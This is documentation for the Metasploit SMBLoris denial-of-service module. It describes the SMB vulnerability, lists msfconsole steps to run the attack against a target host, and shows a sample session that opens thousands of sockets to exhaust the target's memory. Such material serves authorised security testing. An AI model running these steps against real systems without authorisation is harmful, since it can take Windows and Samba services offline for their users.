## Vulnerable Application

  This module exploits a vulnerability in the NetBIOS Session Service Header for SMB.
  Any Windows machine with SMB Exposed, or any Linux system running Samba are vulnerable.
  See [the SMBLoris page](http://smbloris.com/) for details on the vulnerability.

  The module opens over 64,000 connections to the target service, so please make sure
  your system ULIMIT is set appropriately to handle it. A single host running this module
  can theoretically consume up to 8GB of memory on the target.

## Verification Steps

  Example steps in this format (is also in the PR):

  1. Start msfconsole
  1. Do: `use auxiliary/dos/smb/smb_loris`
  1. Do: `set rhost [IP]`
  1. Do: `run`
  1. Target should allocate increasing amounts of memory.

## Scenarios

### 

```
msf auxiliary(smb_loris) > use auxiliary/dos/smb/smb_loris
msf auxiliary(smb_loris) > set RHOST 192.168.172.138
RHOST => 192.168.172.138
msf auxiliary(smb_loris) >

msf auxiliary(smb_loris) > run

[*] Starting server...
[*] 192.168.172.138:445 - 100 socket(s) open
[*] 192.168.172.138:445 - 200 socket(s) open
...
[!] 192.168.172.138:445 - At open socket limit with 4000 sockets open. Try increasing you system limits.
[*] 192.168.172.138:445 - Holding steady at 4000 socket(s) open
...
```
